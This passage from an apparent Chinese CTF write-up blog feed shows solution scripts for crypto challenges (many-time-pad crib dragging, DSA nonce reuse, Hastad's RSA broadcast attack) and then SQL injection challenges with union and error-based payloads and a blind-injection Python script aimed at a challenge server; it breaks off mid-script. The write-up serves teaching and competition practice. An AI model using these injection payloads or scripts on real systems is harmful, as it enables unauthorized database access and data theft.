class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">c1 = <span class="string">'a5f764be8b5e9e20fe6f95a4282d758d8d14b02522fe9d83adc325432b48533dddff79633e0c874fcc0b9f'</span></span><br><span class="line">c2 = <span class="string">'87f837b4c57a9d26e36dd1c2697d7f8d8710bb2527e8c9a2abc329563a01483993db772d2c07d906c00b9f'</span></span><br><span class="line">c3 = <span class="string">'91e47eafdf789c6fec6495a8616172969117ac6437e8d9e7aace606730524d37ddfd79743e0fca41cd1bcb'</span></span><br><span class="line">c4 = <span class="string">'80ed63b3ce429d3bfd5592e178657b91bd0aad5a27ecd3a0adc52f552c5c6f3190d16f2d1417cf008511cc'</span></span><br><span class="line">c5 = <span class="string">'c6f737b3c27a9a6ffe6999e767613e878717bb6637e4cba2e8c0284f7f524a3598c87f603a118b18ca0ad4'</span></span><br><span class="line">c6 = <span class="string">'95b660b2df75d23be56fd1f8676177808743aa6a63fed2abbed260433e52402bd3fb79623b42c71ac61391'</span></span><br><span class="line">c = [c1,c2,c3,c4,c5,c6]</span><br><span class="line"></span><br><span class="line">key = int(<span class="string">'hct'</span>.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlagIndex</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> cc <span class="keyword">in</span> combinations(c, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">print</span> hex(int(cc[<span class="number">0</span>][<span class="number">-6</span>:], <span class="number">16</span>) ^ int(cc[<span class="number">1</span>][<span class="number">-6</span>:], <span class="number">16</span>) ^ key)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMessage</span><span class="params">(key)</span>:</span></span><br><span class="line">    l = len(key)</span><br><span class="line">    key = int(key,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        cc = int(c[i][:l],<span class="number">16</span>)</span><br><span class="line">        m = long_to_bytes(cc ^ key)</span><br><span class="line">        <span class="keyword">print</span> str(i) + <span class="string">': '</span> + m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey</span><span class="params">(m,num)</span>:</span></span><br><span class="line">    l = len(m) * <span class="number">2</span></span><br><span class="line">    m = int(m.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">    cc = int(c[num][:l],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(cc ^ m)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor3</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">    s = string.ascii_letters + <span class="string">','</span> + <span class="string">' '</span> + <span class="string">'.'</span></span><br><span class="line">    m = long_to_bytes(a ^ b ^ c)</span><br><span class="line">    <span class="keyword">if</span> m <span class="keyword">not</span> <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CribDragging</span><span class="params">(mm)</span>:</span></span><br><span class="line">    l = len(mm) * <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> string.lowercase + <span class="string">'_'</span> + <span class="string">'&#125;'</span>:</span><br><span class="line">        k = int(k.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">        cc = [<span class="string">'*'</span>] * <span class="number">6</span></span><br><span class="line">        <span class="keyword">print</span> cc</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">            cc[i] = int(c[i][l:l+<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> xor3(cc[<span class="number">0</span>],cc[<span class="number">3</span>],k) <span class="keyword">or</span> xor3(cc[<span class="number">1</span>],cc[<span class="number">3</span>],k) <span class="keyword">or</span> xor3(cc[<span class="number">2</span>],cc[<span class="number">3</span>],k) <span class="keyword">or</span> xor3(cc[<span class="number">3</span>],cc[<span class="number">4</span>],k) <span class="keyword">or</span> xor3(cc[<span class="number">3</span>],cc[<span class="number">5</span>],k):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">print</span> long_to_bytes(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># getKey('', 1)</span></span><br><span class="line"><span class="comment"># getMessage('')</span></span><br><span class="line">CribDragging(<span class="string">'f&#123;'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="进击的-Crypto-4"><a href="#进击的-Crypto-4" class="headerlink" title="进击的 Crypto [4]"></a>进击的 Crypto [4]</h3><blockquote><p>题目描述： <a href="http://119.29.138.57/crypto/Crypto[4].34b3396feff9f911a61e932a22c4470" target="_blank" rel="external">http://119.29.138.57/crypto/Crypto[4].34b3396feff9f911a61e932a22c4470</a><br>Hint: 基本的数论知识</p></blockquote><p>看下代码，只要求出 k 和 x，便能拿到 flag，最主要的是 encrypt 函数<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data, p, q, g, x, k)</span>:</span></span><br><span class="line">r = pow(g, k, p) % q</span><br><span class="line">s = (invert(k, q) * (SHA1(data) + x * r)) % q</span><br><span class="line"><span class="keyword">return</span> (r, s)</span><br></pre></td></tr></table></figure></p><p>题目还给了两组数据，因为 r1 和 r2 是相等的，s1 - s2 就能消去 x，求出 k，然后再把求出的 k 和其中一组数据代入 s，便能求出 x<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">k = ((SHA1(data1) - SHA1(data2)) * invert(s1 - s2,q)) % q</span><br><span class="line">x = (((k * s1 - SHA1(data1))) * (invert(r1,q))) % q</span><br></pre></td></tr></table></figure></p><h3 id="进击的-Crypto-5"><a href="#进击的-Crypto-5" class="headerlink" title="进击的 Crypto [5]"></a>进击的 Crypto [5]</h3><blockquote><p>题目描述： 似曾相识？<br><a href="http://119.29.138.57/crypto/Crypto[5].34b3396feff9f911a61e932a22c4470" target="_blank" rel="external">http://119.29.138.57/crypto/Crypto[5].34b3396feff9f911a61e932a22c4470</a></p></blockquote><p>之前出了一道共享素数攻击，这题也是给了10组 n e c，首先还是先看了下 n 是否互素，结果都互素</p><p>利用的是中国剩余定理</p><p> \begin{matrix} m^e \equiv c_1 \pmod {N_1} \\ m^e \equiv c_2 \pmod {N_2} \\ \vdots \qquad\qquad\qquad \\ m^e \equiv c_n \pmod {N_n} \end{matrix} </p><p>假设 $N = N_1 * N_2 * … * N_n$，求出的结果为 C，则 $m^e \pmod C \equiv N$，然后如果 e 比较小的话，$m^e &lt; N$，那么 $m^e = C$，所以对 C 开 e 次方根就是 m 了，附上脚本吧<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">10</span></span><br><span class="line">n = [</span><br><span class="line"><span class="number">17551188754807399016342420221734945766749930201727412345251590531404061480740932995199065332987719183197199448336435851015540272155441486746027315107821340969105623451575872580170978368650593880274076025520453956378539766228430429142117994616985318963125739076826635459215114946159348678398268099389525414431618517743889314085714390430972783223270985688988995257770363117225472590084489120958397189130958462784532637453482182763505791720641422686749616216521724012108378680177131928438795893866425040489551258902610047574579899692834984999209528110849342042529825594061894238371591910354584305136154355365191215400149</span>,</span><br><span class="line"><span class="number">21840437284422601584177601857355845296420300157767339109572377640408362726674561246210400400760474187121246893712480109326893614162779470768415282900713800983815570602250068673695044749932532689851310770087552524620857623442019428044482787965428075984951982104920901562456426672111590909100736209153905853035127247720276974050404663847547090362780729077829594684995979457326414947449083219461617302643392904522733812903141301332227357689517880801845510579518887472928083718826890369016944549160461428710615747001273521253638766267143341819170249648385341127263707417642925464809788975715332938666417316695941347477577</span>,</span><br><span class="line"><span class="number">30015914133986758133105015082922460910471726819000479872816812806794140887209294393963063273377891203069864711466776200108173672428779293308320460116493040572826915020654293929241843686728296387400110062099074573009645563520805301899962344680821396200256042478539540675850427377958553324581371362112652752444824919601767821622038488365501031636558236126052654241662743070651213369566898998898634441261811655053789384588711547685939927721116404429914329081432990913321296964957260691148704710581681774562904924080813274984809940008968629515304859518629473284018332651831587916402539386242421630250537030688162675751761</span>,</span><br><span class="line"><span class="number">18009718435825445649372629634867772247035138229493108362713630947680338354227735572070882390378632440365163117094233413520107070581908224239210969172094402760924055334584259678276505919418191623762998249724248379302786621689049107500760348303940112840664926231345646325964133281550765454719628161600475143792567309947330130747860125557547051843620899629217636918002929846463097841539446014019579830347356084080488561917440356848465812937246809018168582635191619622041079012450531811237168105634382108634135880887093525611263186925213027913337454706919754923593714509998062073450679720905569489304398625255143801533277</span>,</span><br><span class="line"><span class="number">27090736422393991189249636552945539144039087911497773160371557650625344533254580764344628540515132884576739746597729079146155130899009238110101654711303800340566538298798432929136509923129089904647023409146264405964139002638684510681372633714179570768685640570209727600215295330846361754314973731753734397312932947433225732597524076563605729037998272803472953079912899867244318073144564355326520230078681106746670895643454939714423661018216469020021429142336238301775948794784776906058601395026463842070755547793192470653204078222827768950823747061655106900276571547680451953562314376913592896427730473091360051391129</span>,</span><br><span class="line"><span class="number">22277916445389799876692954866506052125036892596099795492064670519272419621528759837318253665292779127861537748967309681231938516330289846519214661138299205082421968922350230121526530080908053297879027158545040193774647350499415863211113776785399848472712293535289113810322398103983587423306282629848367328743089145940536913390664697321526306054579656600439140061667264516070003507841618352122567379038304294976725469305215682426898731699093794930417366769249256999177339843020364367769712776225743916112170787273891225926246407201080202593858063362565931942590349178361085396799890148505959437244983447934838792051793</span>,</span><br><span class="line"><span class="number">20851005254704933958354817552975190588383962843827122226904964048318053243049822277049715505735762051530592940514007687138882551369906711787133432792478447465241409449145625470766867280545673313710877827491010966285871747638401315338616986782370641881615238434667687936400955629642629748987839996011550408156162317201139746453148874558603034756902297066835592748562014100033050736650359512497633206350878620421058840864178654150287452573363251543090733404389037241843869379543719804499640600546216051812575335078292203435075056740907356476508423562893159958041443951220933694064510275964264723600894558623421819904501</span>,</span><br><span class="line"><span class="number">21745680718194037861694569863678082853797244380310200176477643943644972463871360669070584682807703870684830948023158889780219716829353665600564791257912082043905122048004593803193375178269942973208249276102769671038752489438400731535367257356207098737711096953679231300720903502192144476519811856646400822239966219746455729409375771797064825552958482297097797911599808242875799342438899636328763766908154658738969614707377852147843953614178305416594819846812426828300689497046389665982817209315784313108617753052015326937047712513569322963102500122038505770232917473260057408981125469607573191926134043719437868156273</span>,</span><br><span class="line"><span class="number">23257483042331781031320004066395973098539881870433034498180628292164825476845647596122889756396987220787263478778647199033523248861079487991256044473644515960559630792146394039814096408486541588067643811077716428015000310006227815563853161604153799667073262886506475792902392829571472354691875108497532721686076971371510238161060553858839091026451266521753830084143245517459861325880906431205328541736948784727909518259034781432825317588016829248046749554245422672923121452470552323438808591118050034108325754535134236727740460190849252647561826203675666601441506024780605194340777802389960180532831878689458096046821</span>,</span><br><span class="line"><span class="number">27637004622327338030988157906180324667829916751358977640832765328645718696385482091781513197472066052101704131751158627239657425473994441143385613105528200215275110466263289952962400664293602133856809475295970322767309563273999319926150648399522508592521685688896842833243324070987594588134776515978198364901455727292006058624015674914131447232032058875410956114939938460192876157612457774033922125553271809409381181134668696682847583314698759337802814876161751333701826176655372126746717533228292189928645064111959824895679517476699556313948724818860906006774808944802984477517788391260149504822396276593451707118257</span></span><br><span class="line">]</span><br><span class="line">c = [</span><br><span class="line"><span class="number">4675182605549711347653299514777826238559040200527747810846901991433127025723361807211672208052862870258047285285949212515664278410499603829663266213968511493974766674071825225536665267049044619340378438531615983696406305841945756396579371794826265549929503043134668360055027276522368879193620937457881486509311711905722483187734650127796510808637890189952840971330768913946884525594627652458745930532219238258911608744112001798136394806004726472890838481881026716605743812674350955258003794590748258523929460446986020794445478076559635145181909093786617716473870604463315696183050495143502762614767485881979217577416</span>,</span><br><span class="line"><span class="number">4586033930015814975553487614321341290358072960539564849589758593801587823414394351862074093343255479635303199078561905260793645869942622136164615776822867275172888812989071016687658023005838776181437470204528335444413852561895603377955959308318399246963213964044984235974352824060625970587119586612774322385216810264819426458641852166009899106655036755913322283219739741020656812034348404092018340277026844114272699170323014050087289715403989671918767712613414346320222745328800096615947138667139053339483278319521201983885423491905171167675501563556563890821756892474999549635650486944010346554641603343238490572689</span>,</span><br><span class="line"><span class="number">12012575342366442210994368605032582129674485327006093552902983877957202172783938071684841031902396156899396879136388606996807608296316795628987877357547213450360953742947781700549506469226564975927361748596520878542651668963131021269851928174681007347771519569914690980744941965086762285630082781013781879511681353119117280354102271439057204066405072328422057721895983540492150402309552609035008272366176657384174081229798739099558539083074489500359062010164358300087124447037922844709870430218019673914305742939927888838599616520300011913022792060392260618046807788302643742874847024153198113792628046678578753632923</span>,</span><br><span class="line"><span class="number">4249005911324898630458723491151576810198619078332972911420166645127258598519950448507640904379342817486426262054889199369385257812524759761245588973651578211291344326619317559377360319507727729535083143293335799588196976241949218037833747839545295030259115279668065886560417877204054684495047181117075603468672292268831273735956964067626837975218539840667641885621426607941950306330198897187683754687379611844278471572791816397950634388907233312117920634807989734011132718334334850592111651631323130933438007008983489782601827321396168104668493332626558911838721998173148508994771473224050827471186478106896949413831</span>,</span><br><span class="line"><span class="number">18557109853898405974924769550105345673703067457537813607252151469933140760798378574244439559372100428971400070351173140348823652755825601433268832363575896137364288069984314151346137206115518309597389268875150549696376813277778514591532615794294637044626683931367510181612383681914421702261592233265455950023252407680604041046629667703207133146853618989187597749132650514038584280417791134426596848369417626039533740827554552117727501565841065077835398951826747855393552731497438983274201599740189743630949174610722118659019630964669901438690028070213710833335622573526403588737092869273969581607637522572757015237506</span>,</span><br><span class="line"><span class="number">19221531342713801219971420455098666365124810169512711030444063942333694562364114172361552139176582476168134219937393468391346535097965763785916484012657401095066804857900941482772687159471483908107669892419626059680168762119954068288719303591498504050604628627299671160225276355636519961578118413913001058744164531470610279168723402009469959377794138715204862239973561494796213624769358906726186769711689962808937828553399403173762034548974335960107700638910231658795639167906700770120741974418495196827830462542130080965552102416180517600397897065113788279096066792533807104187868678848857780735334749865813019681909</span>,</span><br><span class="line"><span class="number">2043866718532927301454127017521835945401727173760352488220517028498861777262807036566165189285730569375083406234212921588654098421290088269551352101830688429903600880691046607902396566775005694148315605616437713115424223594710186677844867273218443350479253279231960061845711898262461185970057002138523262952260834191169438764964758526877361442277664448596129451496415695776781879266732057920583336999766633938582656240607973759756021032489262381190762825081392613689817792764844409877116240223852376311404164963595040347176139494461319495285348608562589901671620063620688524249523700500144604558899272202564535295466</span>,</span><br><span class="line"><span class="number">9018406452041117867927204674649220929160509942604290572303644183451237944912470236367308266319079349289625873447647200474598755869642999213142758825809522474810817609751187533346902667225032452694187162262683056445775455963994237202296104812386374636270188433521927503415507963477240913270879794141170568393025367891003921090015993944946205723601349149601256727433716155121883420271498265967234259068535172501445643752691860997480636101699340740265505767091920668218018002976632111256430655619061247292025654740889077014179258647084698229733160071306390020603636210736363198302407289195286953980520285032528614492926</span>,</span><br><span class="line"><span class="number">17978671919734595201524186618868659656036765546673883938819333911564948587858876495802600244078413312462813938682090761599961604959609423010904187720748539707172853352540370208991902929002036775381503365170196838626379685712050728875172622632447875368166743751159775611642629408534890684109652648484868876710697249351895355111511281037497347712241242908563699707272843032773107477368790419109907271096351457526240471975122296483655337150130000812813081239181653384419149292970320991892073352340649237387406498087734708162094476092368665794350968924289259192893289337038201504066310173284757044802449600666007821509553</span>,</span><br><span class="line"><span class="number">8597067880812456123669594978660135058668875834924201279924162761020137582662367704504988576614934966062323191666982943113656186783894245035267051756178331490881264629774635620179678000947771928854566239213498586078670870127924696459041295848474073879336501325437194563845414699360564571136683492426292766799121155041276162673427700999761055592609213603158576637212003771003996722743170543342885011289692845493598413965688949325670519743413071479057382602222055902593614159427186017797992219490308930116850084553033461316509457834436420821916094206010206229370273622681413176347187252950087428868295965528772832409316</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">le = len(n)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> n:</span><br><span class="line">N *= num</span><br><span class="line"></span><br><span class="line"><span class="comment"># N1,N2...Nn</span></span><br><span class="line">NN = [<span class="keyword">None</span>] * le</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(le):</span><br><span class="line">NN[i] = N / n[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># NN1 * t1 = 1 (mod n1)</span></span><br><span class="line">t = [<span class="keyword">None</span>] * le</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(le):</span><br><span class="line">t[i] = gmpy2.invert(NN[i],n[i])</span><br><span class="line"></span><br><span class="line"><span class="comment"># x</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(le):</span><br><span class="line">x += c[i]*t[i]*NN[i]</span><br><span class="line"></span><br><span class="line">res = x % N</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(gmpy2.iroot(res,e)[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># result is: When e are small and same,it can be Hastad's broadcast attack.Maybe we won't have topic aboout RSA,but I wish you can explore it Non-stop.hctf&#123;Hastad's_broadcast_attack_is_interesting&#125;</span></span><br></pre></td></tr></table></figure></p><p>如果仍对题目有疑惑的地方或者 wp 有错误的地方，直接问我吧</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;明天就要坐车回去了，因此就只写下我出的几道 Crypto 吧，PENTEST 和 Misc 的 wp 请关注 &lt;a href=&quot;http://c014.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;C014’s blog&lt;/a&gt;&lt;/p&gt;
&lt;h3 i
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>HCTF-GAME week3 writeup</title>
    <link href="http://heartsky.info/2017/02/06/HCTF-GAME-week3-writeup/"/>
    <id>http://heartsky.info/2017/02/06/HCTF-GAME-week3-writeup/</id>
    <published>2017-02-06T15:47:49.000Z</published>
    <updated>2018-10-26T06:08:42.425Z</updated>
    
    <content type="html"><![CDATA[<h3 id="从0开始之SQLI之0"><a href="#从0开始之SQLI之0" class="headerlink" title="从0开始之SQLI之0"></a>从0开始之SQLI之0</h3><blockquote><p>题目描述： <a href="http://45.32.25.65/nweb/sqli1/?user=user1" target="_blank" rel="external">http://45.32.25.65/nweb/sqli1/?user=user1</a></p></blockquote><p>打开后加个单引号返回<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span>user1<span class="string">''' at line 1</span></span><br></pre></td></tr></table></figure></p><p>确定用的是单引号，并且没有什么过滤。尝试 <code>&#39;||&#39;1</code> 来得到当前表中的所有数据，得到提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maybe flag is in another space</span><br></pre></td></tr></table></figure></p><p>猜测 flag 在另一张表中，采用联合查询来获取表名、列名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">' union <span class="keyword">select</span> table_name,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">hhhhctfflag</span><br></pre></td></tr></table></figure></p><p>获取 flag<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,flag <span class="keyword">from</span> hhhhctf%<span class="number">23</span></span><br></pre></td></tr></table></figure></p><h3 id="从0开始之SQLI之1"><a href="#从0开始之SQLI之1" class="headerlink" title="从0开始之SQLI之1"></a>从0开始之SQLI之1</h3><blockquote><p>题目描述： <a href="http://45.32.25.65/nweb/sqli2/?id=1" target="_blank" rel="external">http://45.32.25.65/nweb/sqli2/?id=1</a></p></blockquote><p>根据 <code>id=2-1</code> 和 <code>1%2b1</code> 的返回结果确定是数字型注入<br>测试了下 name 一列必须返回 <code>user</code> 才显示，那就不能通过直接 union 查询的方式获取了<br>但是单引号还是有错误，那么这里应该是报错注入(显错注入)了，大概就是这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))%23</span><br></pre></td></tr></table></figure></p><p>简单来说，对于 ExtractValue 和 UpdateXML 函数而言，第二个参数值应该是一个 XPATH 表达式，如果不合法(包含特殊符号)，就会报 XPATH 语法错误</p><p>想要知道具体原理的可以看下我以前写的一篇<a href="http://heartsky.info/images/2016/12/04/%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84-MySQL-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">文章</a></p><h3 id="从0开始之SQLI之2"><a href="#从0开始之SQLI之2" class="headerlink" title="从0开始之SQLI之2"></a>从0开始之SQLI之2</h3><blockquote><p>题目描述： 让火焰净化一切…<br><a href="http://45.32.25.65/nweb/sqli3/" target="_blank" rel="external">http://45.32.25.65/nweb/sqli3/</a></p></blockquote><p>题目形式和上题类似，加了个验证码。简单测试下，可以发现没有任何错误回显了，只有 <code>it must return username</code> 的提示，那么就是盲注了，必须要写脚本了 233</p><p>大致思路就是一位一位的选取出表名、列名以及最后的 flag，还是直接贴上脚本吧<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">HTTP POST</span></span><br><span class="line"><span class="string">盲注</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://45.32.25.65/nweb/sqli3/index.php'</span></span><br><span class="line">pat = <span class="string">'&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;(.*?)&lt;/td&gt;&lt;td&gt;'</span></span><br><span class="line">headers = &#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=c8qn7ef6lg7pvmof8hnlbhcdb6"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabase</span><span class="params">()</span>:</span></span><br><span class="line">payload = <span class="string">"-1 UNION SELECT length(DATABASE()),'user'#"</span></span><br><span class="line">databaseLen = getData(payload)</span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(databaseLen)):</span><br><span class="line">payload = <span class="string">"-1 UNION SELECT ascii(substring(DATABASE(),"</span> + str(i+<span class="number">1</span>) + <span class="string">",1)),'user'#"</span></span><br><span class="line">ch = getData(payload)</span><br><span class="line">database += chr(int(ch))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] The current database is '</span> + database</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTables</span><span class="params">()</span>:</span></span><br><span class="line">payload = <span class="string">"-1 UNION SELECT count(*),'user' FROM information_schema.tables WHERE table_schema=DATABASE()#"</span></span><br><span class="line">tableNumber = getData(payload)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] Table number is '</span> + tableNumber</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(tableNumber)):</span><br><span class="line">tableName = <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] Table name '</span> + str(i) + <span class="string">': '</span>,</span><br><span class="line">payload = <span class="string">"-1 UNION SELECT length(table_name),'user' FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT "</span> + str(i) +<span class="string">",1#"</span></span><br><span class="line">tableLen = getData(payload)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(int(tableLen)):</span><br><span class="line">payload = <span class="string">"-1 UNION SELECT ascii(substring(table_name,"</span> + str(j+<span class="number">1</span>) + <span class="string">",1)),'user' FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT "</span> + str(i) +<span class="string">",1#"</span></span><br><span class="line">ch = getData(payload)</span><br><span class="line">tableName += chr(int(ch))</span><br><span class="line"><span class="keyword">print</span> tableName</span><br><span class="line">getColumns(tableName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getColumns</span><span class="params">(table)</span>:</span></span><br><span class="line">payload = <span class="string">"-1 UNION SELECT count(*),'user' FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='"</span> + table + 